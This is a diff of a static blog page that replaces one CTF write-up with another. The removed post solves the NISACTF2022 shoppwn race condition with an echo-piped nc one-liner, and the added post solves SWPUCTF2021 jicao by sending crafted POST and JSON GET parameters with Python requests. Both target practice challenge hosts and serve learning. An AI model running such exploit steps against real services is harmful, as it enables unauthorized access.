@@ -6,17 +6,16 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>NISACTF2022-shoppwn-wp | Antel0p3&#39;s blog</title>
+  <title>SWPUCTF2021-jicao-wp | Antel0p3&#39;s blog</title>
   <meta name="author" content="John Doe">
   
-  <meta name="description" content="相关资源  
-0x1 分析sell的时候使用pthread_create，其中有usleep，只要发送速度足够快，可以卖出两次
-0x2 exp12345echo -e &amp;#x27;3\n0\n3\n0\n2\n1\n1\n&amp;#x27; | nc node3.anna.nssctf.cn 28736#">
+  <meta name="description" content="网页看到源代码，可知需要post id&amp;#x3D;wllmNB; get json&amp;#x3D;{x&amp;#x3D;wllm}
+12345678&amp;lt;?phphighlight_file(&amp;#x27;index.php&amp;#x27;);include(&amp;quot;flag.php&amp;quot;);$id=$">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="NISACTF2022-shoppwn-wp"/>
+  <meta property="og:title" content="SWPUCTF2021-jicao-wp"/>
   <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
 
   
@@ -113,13 +112,13 @@
 								<h1>
 									
 											
-												NISACTF2022-shoppwn-wp
+												SWPUCTF2021-jicao-wp
 									
 									
 								</h1>
 								
-									<p id="/2023/06/13/NISACTF2022-shoppwn-wp/" class="leancloud-visitors view"
-										data-flag-title="NISACTF2022-shoppwn-wp">
+									<p id="/2023/06/28/SWPUCTF2021-jicao-wp/" class="leancloud-visitors view"
+										data-flag-title="SWPUCTF2021-jicao-wp">
 										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 									</p>
 									
@@ -140,9 +139,17 @@
 	<div class="mypage">		
 	  		
 
-	  <p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp">相关资源</a>  </p>
-<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x1.png?raw=true" alt="img"><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x2.png?raw=true" alt="img"><br>sell的时候使用pthread_create，其中有usleep，只要发送速度足够快，可以卖出两次</p>
-<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;3\n0\n3\n0\n2\n1\n1\n&#x27; | nc node3.anna.nssctf.cn 28736</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sell pen</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sell pen</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">buy flag</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show</span></span><br></pre></td></tr></table></figure>
+	  <p>网页看到源代码，可知需要post id&#x3D;wllmNB; get json&#x3D;{x&#x3D;wllm}</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>HackBar</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/28/SWPUCTF2021-jicao-wp/0x1.png?raw=true" alt="image-20230628111058476"></p>
+</li>
+<li><p>python</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">post_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;wllmNB&quot;</span>&#125;</span><br><span class="line">get_data = &#123;<span class="string">&quot;json&quot;</span>: <span class="string">&#x27;&#123;&quot;x&quot;:&quot;wllm&quot;&#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># params 为get数据,data为post数据</span></span><br><span class="line">response = requests.post(<span class="string">&quot;http://node2.anna.nssctf.cn:28110/&quot;</span>, data=post_data, params=get_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></li>
+</ol>
+
 	  <div class="article-footer-copyright">
 
     本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
@@ -151,7 +158,7 @@
 	</div>
 
 	<!-- 
-		<span id="/2023/06/13/NISACTF2022-shoppwn-wp/" class="leancloud-visitors view" data-flag-title="NISACTF2022-shoppwn-wp">
+		<span id="/2023/06/28/SWPUCTF2021-jicao-wp/" class="leancloud-visitors view" data-flag-title="SWPUCTF2021-jicao-wp">
 			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 		</span>
 	 -->
@@ -163,13 +170,12 @@
 
     
     
-    <a href="/2023/06/15/zer0pts2020-easystrcmp-wp/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2023/06/13/GDOUCTF2023-easymath-wp/" type="button" class="btn btn-default ">Next<i
+    <a href="/2023/06/20/深育杯2021-find-flag-wp/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -228,7 +234,7 @@ new Valine(valineConfig);
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2023-06-13 
+	2023-06-28 
 	</div>
 	
 
@@ -239,7 +245,7 @@ new Valine(valineConfig);
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/pwn-wp/">pwn-wp<span>6</span></a></li>
+    <li><a href="/categories/web-wp/">web-wp<span>1</span></a></li>
   </li>
 
     </ul>
@@ -252,7 +258,7 @@ new Valine(valineConfig);
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/CTF/">CTF<span>14</span></a></li> <li><a href="/tags/pwn/">pwn<span>7</span></a></li> <li><a href="/tags/thread/">thread<span>1</span></a></li> <li><a href="/tags/NISACTF2022/">NISACTF2022<span>3</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>9</span></a></li>
+  <li><a href="/tags/CTF/">CTF<span>14</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>9</span></a></li> <li><a href="/tags/web/">web<span>1</span></a></li> <li><a href="/tags/php/">php<span>1</span></a></li> <li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>1</span></a></li>
     </ul>
 	</div>
 		
